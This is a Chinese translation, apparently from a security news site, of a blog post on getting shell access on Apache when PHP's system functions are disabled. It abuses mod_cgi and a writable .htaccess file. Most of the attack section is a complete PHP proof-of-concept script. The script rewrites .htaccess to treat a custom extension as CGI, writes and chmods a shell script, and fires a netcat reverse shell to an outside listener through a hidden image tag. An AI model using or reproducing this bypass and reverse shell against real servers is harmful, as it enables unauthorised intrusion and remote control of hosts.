# 禁用php的system函数以获取shell访问

阅读量 **137928**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2016-05-03 21:23:03

 **x**

##### 译文声明

本文是翻译文章，文章来源：360安全播报

原文地址：<https://blog.asdizzle.com/index.php/2016/05/02/getting-shell-access-with-php-system-functions-disabled/>

译文仅供参考，具体内容表达以及含义原文为准。

您可以禁用PHP函数

如果你拥有一个运行着PHP的Web服务器,禁用一些PHP的危险功能可能是一个好主意,其中有些功能也许是你的网站所不需要的
。如果攻击者设法在你的服务器上运行恶意代码,那么限制一些函数提供功能可能会减少攻击所带来的危害。幸运的是,PHP为我们提供了一种简单的方法来做到这一点。你只需要做到对你想要禁用的函数执行disable_functions
功能。然而,在某些情况下,系统命令的执行仍然是有可能的,我会用一个启用了mod_cgi的.htaccess文件作为例子给你解释。

这种方法只适用于一部分的Apache服务器配置,我敢肯定我不是第一个发现这个问题的人。不管怎样,这里列举了3项需要满足的最低要求:

需要启用mod_cgi;

需要允许htaccess文件;

你必须能够写入文件。

背景知识:

什么是mod_cgi?

其中CGI代表通用网关接口。它允许Web服务器与可执行文件进行交互。这意味着你可以用C,Perl或者Python来写Web应用程序。即使全部由shell脚本组成Web应用程序也是可能的。你还可以把PHP作为一个CGI程序来运行,而不是作为一个模块运行。

什么是htaccess文件?

Apache支持所谓的虚拟主机。虚拟主机通常用于在一台机器上运行多个网站或者子域。这些内部文件中,你可以按照自己的喜好更改网站的Web根目录或Apache模块的特定选项中的多种设置。有时候在一个共享的托管环境中,用户被允许按照自己的喜好定制自己的网站,但是他们没有更改同一主机上的其他用户设置的能力。这时候htaccess文件就派上用场了。它是让你改变在每个目录下的很多虚拟主机设置的基础。通常使用htaccess能够更好更快地在虚拟主机文件中直接做到这点,只要你有机会获得它们。

我们如何利用呢?

有了这些知识之后,我们如何才能利用它们拿到系统shell访问权限,即使在PHP中是被禁用的?
首先我们要检查上述所有的要求是否得到了满足。正如我上面所说的,有的时候,事实并非如此。
但是,如果我们足够幸运的话,我们可以尝试一切写入或启用来达到目的。我们试图达到以下目的:

我们希望能够在当前目录下执行CGI脚本。这需要利用一个htaccess文件中的Options +ExecCGI 来完成。
mod_cgi必须能够区分实际的CGI脚本和其它的文件。为此,我们需要指定一些它能识别的扩展。可以是任何你想要的扩展,例如.dizzle。我们使用在
.htaccess 文件中的AddHandler cgi-script .dizzle做到这一点。
现在,我们能够上传以.dizzle后缀结尾的shell脚本,并且利用PHP
的chmod命令('shell.dizzle',0777)使它成为可执行文件。当我们的脚本有输出之后,首先我们必须要设置一个与内容同类型的头部,否则Apache将显示StatusCode
500错误。我们这样做只是为了把echo -ne“Content-Type:text / html n
n”作为我们的shell脚本中的第一输出。之后,你可就以完成几乎所有你可以用普通shell脚本所做到的事情。

只是看这些理论的东西比较无聊,下面是一个PoC攻击实例:

    
    
    <?php
    $cmd = "nc -c '/bin/bash' 172.16.15.1 4444"; //command to be executed
    $shellfile = "#!/bin/bashn"; //using a shellscript
    $shellfile .= "echo -ne "Content-Type: text/html\n\n"n"; //header is needed, otherwise a 500 error is thrown when there is output
    $shellfile .= "$cmd"; //executing $cmd
    function checkEnabled($text,$condition,$yes,$no) //this surely can be shorter
    {
    echo "$text: " . ($condition ? $yes : $no) . "<br>n";
    }
    if (!isset($_GET['checked']))
    {
    @file_put_contents('.htaccess', "nSetEnv HTACCESS on", FILE_APPEND); //Append it to a .htaccess file to see whether .htaccess is allowed
    header('Location: ' . $_SERVER['PHP_SELF'] . '?checked=true'); //execute the script again to see if the htaccess test worked
    }
    else
    {
    $modcgi = in_array('mod_cgi', apache_get_modules()); // mod_cgi enabled?
    $writable = is_writable('.'); //current dir writable?
    $htaccess = !empty($_SERVER['HTACCESS']); //htaccess enabled?
    checkEnabled("Mod-Cgi enabled",$modcgi,"Yes","No");
    checkEnabled("Is writable",$writable,"Yes","No");
    checkEnabled("htaccess working",$htaccess,"Yes","No");
    if(!($modcgi && $writable && $htaccess))
    {
    echo "Error. All of the above must be true for the script to work!"; //abort if not
    }
    else
    {
    checkEnabled("Backing up .htaccess",copy(".htaccess",".htaccess.bak"),"Suceeded! Saved in .htaccess.bak","Failed!"); //make a backup, cause you never know.
    checkEnabled("Write .htaccess file",file_put_contents('.htaccess',"Options +ExecCGInAddHandler cgi-script .dizzle"),"Succeeded!","Failed!"); //.dizzle is a nice extension
    checkEnabled("Write shell file",file_put_contents('shell.dizzle',$shellfile),"Succeeded!","Failed!"); //write the file
    checkEnabled("Chmod 777",chmod("shell.dizzle",0777),"Succeeded!","Failed!"); //rwx
    echo "Executing the script now. Check your listener <img src = 'shell.dizzle' style = 'display:none;'>"; //call the script
    }
    }
    ?>

本文翻译自360安全播报 [原文链接](https://blog.asdizzle.com/index.php/2016/05/02/getting-shell-access-with-php-system-functions-disabled/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **AuRora17** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/83859](/post/id/83859)

安全客 - 有思想的安全新媒体

本文转载自: [360安全播报](https://blog.asdizzle.com/index.php/2016/05/02/getting-shell-access-with-php-system-functions-disabled/)

如若转载,请注明出处： <https://blog.asdizzle.com/index.php/2016/05/02/getting-shell-access-with-php-system-functions-disabled/>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __0赞

 __收藏

![](https://p0.ssl.qhimg.com/t010857340ce46bb672.jpg) AuRora17

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

